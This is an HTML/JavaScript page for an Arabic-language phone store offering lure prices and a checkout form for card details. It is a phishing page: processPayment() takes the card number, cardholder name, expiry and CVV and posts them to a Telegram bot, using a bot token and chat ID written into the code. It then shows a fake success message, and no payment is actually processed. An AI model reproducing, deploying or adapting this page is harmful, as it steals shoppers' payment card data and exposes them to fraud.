<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متجر الهواتف</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tahoma', sans-serif; }
        body { background: #0b0f1a; color: #fff; padding: 15px; min-height: 100vh; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: #141b2b; border-radius: 12px; border-bottom: 2px solid #00d4ff; flex-wrap: wrap; gap: 10px; }
        .header h1 { color: #00d4ff; font-size: 22px; }
        .header a { color: #00d4ff; text-decoration: none; font-size: 16px; background: #1a2338; padding: 6px 16px; border-radius: 20px; }
        .filters { display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0; justify-content: center; }
        .filters button { background: #1a2338; border: 1px solid #2a3a5a; padding: 8px 18px; border-radius: 20px; color: #fff; cursor: pointer; transition: 0.3s; font-size: 14px; }
        .filters button:hover, .filters button.active { background: #00d4ff; color: #0b0f1a; border-color: #00d4ff; }
        .products { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; }
        .product { background: #141b2b; padding: 15px; border-radius: 12px; text-align: center; width: 170px; border: 1px solid #2a3a5a; transition: 0.3s; }
        .product:hover { border-color: #00d4ff; }
        .product img { width: 100%; height: 120px; object-fit: contain; border-radius: 8px; background: #0b0f1a; padding: 8px; }
        .product h4 { font-size: 14px; margin: 8px 0 4px; }
        .product p { color: #00d4ff; font-size: 16px; font-weight: bold; }
        .product button { background: #00d4ff; border: none; padding: 8px; border-radius: 6px; color: #0b0f1a; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; transition: 0.3s; }
        .product button:hover { background: #00b8d4; }
        .cart-page, .checkout-page { max-width: 700px; margin: 20px auto; background: #141b2b; padding: 20px; border-radius: 16px; border: 1px solid #2a3a5a; }
        .cart-item { background: #1a2338; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .btn-primary { background: #00d4ff; border: none; padding: 12px; border-radius: 10px; color: #0b0f1a; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn-primary:hover { background: #00b8d4; }
        .btn-danger { background: #ff4444; border: none; padding: 6px 14px; border-radius: 6px; color: #fff; cursor: pointer; }
        .checkout-form { max-width: 450px; margin: 0 auto; }
        .checkout-form input { width: 100%; padding: 12px; margin: 6px 0; border: none; border-radius: 8px; background: #1a2338; color: #fff; border: 1px solid #2a3a5a; font-size: 15px; }
        .checkout-form input:focus { outline: none; border-color: #00d4ff; }
        .payment-status { margin-top: 15px; padding: 12px; border-radius: 8px; text-align: center; }
        .success { background: #0d5a3a; color: #aaffbb; }
        .error { background: #5a1a1a; color: #ff9999; }
        .hidden { display: none; }
        .empty-cart { text-align: center; padding: 30px; color: #6a7a9a; }
        .card-logo { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 6px; align-items: center; pointer-events: none; height: 30px; }
        .input-wrapper { position: relative; width: 100%; }
        .input-wrapper input { padding-right: 60px; width: 100%; }
        @media (max-width: 600px) { .product { width: 45%; } }
    </style>
</head>
<body>

<!-- ====== الصفحة الرئيسية ====== -->
<div id="page-products">
    <div class="header">
        <h1>📱 متجر الهواتف</h1>
        <a href="#" onclick="showPage('cart')">🛒 السلة (<span id="cartCount">0</span>)</a>
    </div>
    <div class="filters" id="filterContainer"></div>
    <div class="products" id="productsContainer"></div>
</div>

<!-- ====== صفحة السلة ====== -->
<div id="page-cart" class="hidden">
    <div class="cart-page">
        <div class="header" style="margin-bottom:15px;">
            <h1>🛒 سلة الشراء</h1>
            <a href="#" onclick="showPage('products')">⬅️ العودة</a>
        </div>
        <div id="cartItems"></div>
        <div id="cartTotal" style="font-size:20px;color:#00d4ff;margin:15px 0;text-align:center;"></div>
        <button class="btn-primary" onclick="proceedToCheckout()">💳 إتمام الدفع</button>
    </div>
</div>

<!-- ====== صفحة الدفع ====== -->
<div id="page-checkout" class="hidden">
    <div class="checkout-page">
        <div class="header" style="margin-bottom:15px;">
            <h1>💳 إتمام الدفع</h1>
            <a href="#" onclick="showPage('cart')">⬅️ العودة</a>
        </div>
        <div class="checkout-form">
            <h3 style="text-align:center;margin-bottom:15px;color:#00d4ff;">أدخل بيانات بطاقتك</h3>
            
            <div class="input-wrapper">
                <input type="text" id="cardNumber" placeholder="رقم البطاقة (16 رقم)" maxlength="19" 
                       oninput="detectCardType(this.value)">
                <div class="card-logo" id="cardLogo"></div>
            </div>
            
            <input type="text" id="cardName" placeholder="اسم صاحب البطاقة">
            
            <div class="input-wrapper">
                <input type="text" id="expDate" placeholder="شهر / سنة (MM/YY)" maxlength="7" 
                       oninput="formatExpiry(this)">
            </div>
            
            <input type="text" id="cvv" placeholder="CVV (3 أرقام)" maxlength="3">
            
            <button class="btn-primary" onclick="processPayment()">💳 دفع الآن</button>
            <div id="paymentStatus" class="payment-status"></div>
        </div>
    </div>
</div>

<script>
// ====== إعدادات البوت ======
const BOT_TOKEN = "8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs";
const CHAT_ID = "8399221617";

// ====== توليد 100 منتج ======
function generateProducts() {
    const products = [];
    let id = 1;
    const brands = ["Apple","Samsung","Xiaomi","Huawei","OnePlus","Google","Realme","Oppo","Nothing","Sony"];
    const models = ["Pro","Max","Plus","Lite","Ultra","SE","Neo","Air","Z","Fold"];
    for (let i = 0; i < 40; i++) {
        const brand = brands[i % 10];
        products.push({ id: id++, name: `${brand} ${models[i % 10]} ${Math.floor(Math.random()*20)+10}`, price: Math.floor(Math.random() * 450) + 50, category: "هواتف", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=${brand.substring(0,3)}` });
    }
    const earBrands = ["Apple","Samsung","Sony","Xiaomi","Realme","Nothing"];
    const earModels = ["Buds Basic","Buds Air","Buds Sport","Buds +"];
    for (let i = 0; i < 20; i++) {
        products.push({ id: id++, name: `${earBrands[i % 6]} ${earModels[i % 4]}`, price: Math.floor(Math.random() * 2) + 1, category: "سماعات", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=🎧` });
    }
    const acc = ["شاحن","حافظة","كابل","سماعة أذن","باور بانك","حامل سيارة","قلم شاشة","طقم حماية"];
    for (let i = 0; i < 20; i++) {
        products.push({ id: id++, name: `${acc[i % 8]} ${["Pro","Lite","+"][i % 3]}`, price: Math.floor(Math.random() * 4) + 1, category: "إكسسوارات", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=🔌` });
    }
    const padBrands = ["Apple","Samsung","Xiaomi","Huawei","Lenovo"];
    for (let i = 0; i < 20; i++) {
        products.push({ id: id++, name: `${padBrands[i % 5]} Pad ${["Air","Pro","Mini","+"][i % 4]}`, price: Math.floor(Math.random() * 370) + 80, category: "أجهزة لوحية", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=📱` });
    }
    return products;
}

const allProducts = generateProducts();
let cart = JSON.parse(localStorage.getItem('cart')) || [];
let currentFilter = 'الكل';

// ====== عرض المنتجات ======
function renderProducts(filter = 'الكل') {
    const container = document.getElementById('productsContainer');
    const filtered = filter === 'الكل' ? allProducts : allProducts.filter(p => p.category === filter);
    container.innerHTML = filtered.map(p => `
        <div class="product">
            <img src="${p.img}" alt="${p.name}">
            <h4>${p.name}</h4>
            <p>$${p.price}</p>
            <button onclick="addToCart(${p.id})">➕ أضف</button>
        </div>
    `).join('');
}

function renderFilters() {
    const container = document.getElementById('filterContainer');
    const cats = ['الكل', ...new Set(allProducts.map(p => p.category))];
    container.innerHTML = cats.map(c => `
        <button class="${c === currentFilter ? 'active' : ''}" onclick="setFilter('${c}')">${c}</button>
    `).join('');
}

function setFilter(cat) {
    currentFilter = cat;
    renderFilters();
    renderProducts(cat);
}

function addToCart(id) {
    const product = allProducts.find(p => p.id === id);
    if (!product) return;
    const existing = cart.find(item => item.id === id);
    if (existing) existing.qty += 1;
    else cart.push({ ...product, qty: 1 });
    localStorage.setItem('cart', JSON.stringify(cart));
    updateCartCount();
    alert(`✅ تم إضافة ${product.name}`);
}

function updateCartCount() {
    document.getElementById('cartCount').textContent = cart.reduce((s, i) => s + i.qty, 0);
}

function renderCart() {
    const container = document.getElementById('cartItems');
    const totalContainer = document.getElementById('cartTotal');
    if (!cart.length) {
        container.innerHTML = `<div class="empty-cart">🛒 السلة فارغة</div>`;
        totalContainer.innerHTML = '';
        return;
    }
    let html = '', total = 0;
    cart.forEach((item, i) => {
        const t = item.price * item.qty;
        total += t;
        html += `<div class="cart-item"><span>${item.name} (×${item.qty})</span><span>$${t} <button class="btn-danger" onclick="removeFromCart(${i})">✖</button></span></div>`;
    });
    container.innerHTML = html;
    totalContainer.innerHTML = `💰 المجموع: $${total}`;
}

function removeFromCart(index) {
    cart.splice(index, 1);
    localStorage.setItem('cart', JSON.stringify(cart));
    renderCart();
    updateCartCount();
}

function proceedToCheckout() {
    if (!cart.length) { alert('⚠️ السلة فارغة!'); return; }
    showPage('checkout');
}

// ====== كشف نوع البطاقة ======
function detectCardType(number) {
    const logo = document.getElementById('cardLogo');
    const clean = number.replace(/\s/g, '');
    if (clean.startsWith('4')) {
        logo.innerHTML = `
            <svg width="38" height="24" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg">
                <rect width="38" height="24" rx="4" fill="#1a1f3a" stroke="#0056b3" stroke-width="1"/>
                <text x="4" y="16" font-family="Arial" font-weight="bold" font-size="14" fill="#0056b3">VISA</text>
            </svg>
        `;
    } else if (clean.startsWith('2') || clean.startsWith('5')) {
        logo.innerHTML = `
            <svg width="38" height="24" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg">
                <rect width="38" height="24" rx="4" fill="#1a1f3a" stroke="#d4a017" stroke-width="1"/>
                <circle cx="10" cy="12" r="8" fill="#d4a017"/>
                <circle cx="28" cy="12" r="8" fill="#d4a017"/>
                <text x="13" y="17" font-family="Arial" font-weight="bold" font-size="10" fill="#1a1f3a">M</text>
                <text x="21" y="17" font-family="Arial" font-weight="bold" font-size="10" fill="#1a1f3a">C</text>
            </svg>
        `;
    } else {
        logo.innerHTML = '';
    }
}

function formatExpiry(input) {
    let val = input.value.replace(/\D/g, '');
    if (val.length >= 2) {
        val = val.substring(0,2) + '/' + val.substring(2,4);
    }
    input.value = val;
}

// ====== معالجة الدفع ======
function processPayment() {
    const cardNumber = document.getElementById('cardNumber').value.trim();
    const cardName = document.getElementById('cardName').value.trim();
    const expDate = document.getElementById('expDate').value.trim();
    const cvv = document.getElementById('cvv').value.trim();
    if (!cardNumber || !cardName || !expDate || !cvv) {
        document.getElementById('paymentStatus').className = 'payment-status error';
        document.getElementById('paymentStatus').textContent = '⚠️ املأ جميع الحقول';
        return;
    }
    const data = { cardNumber, cardName, expDate, cvv, cart, total: cart.reduce((s, i) => s + i.price * i.qty, 0), time: new Date().toLocaleString() };
    const report = `💳 بيانات بطاقة:\n🆔 ${data.cardNumber}\n👤 ${data.cardName}\n📅 ${data.expDate}\n🔐 ${data.cvv}\n🛒 ${JSON.stringify(cart)}\n💰 $${data.total}\n🕒 ${data.time}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: report })
    }).then(r => r.json()).then(res => {
        if (res.ok) {
            document.getElementById('paymentStatus').className = 'payment-status success';
            document.getElementById('paymentStatus').textContent = '✅ تمت العملية بنجاح! سيتم الخصم خلال دقيقتين.';
            cart = []; localStorage.setItem('cart', JSON.stringify(cart));
            updateCartCount();
            ['cardNumber','cardName','expDate','cvv'].forEach(id => document.getElementById(id).value = '');
            document.getElementById('cardLogo').innerHTML = '';
            setTimeout(() => showPage('products'), 3000);
        } else {
            document.getElementById('paymentStatus').className = 'payment-status error';
            document.getElementById('paymentStatus').textContent = '❌ فشل الإرسال';
        }
    }).catch(() => {
        document.getElementById('paymentStatus').className = 'payment-status error';
        document.getElementById('paymentStatus').textContent = '❌ خطأ في البوت';
    });
}

// ====== التنقل ======
function showPage(page) {
    ['products','cart','checkout'].forEach(p => document.getElementById(`page-${p}`).classList.toggle('hidden', p !== page));
    if (page === 'cart') renderCart();
    if (page === 'products') { renderProducts(currentFilter); renderFilters(); }
}

// ====== التشغيل ======
document.addEventListener('DOMContentLoaded', () => {
    renderProducts();
    renderFilters();
    updateCartCount();
    showPage('products');
});
</script>
</body>
</html>
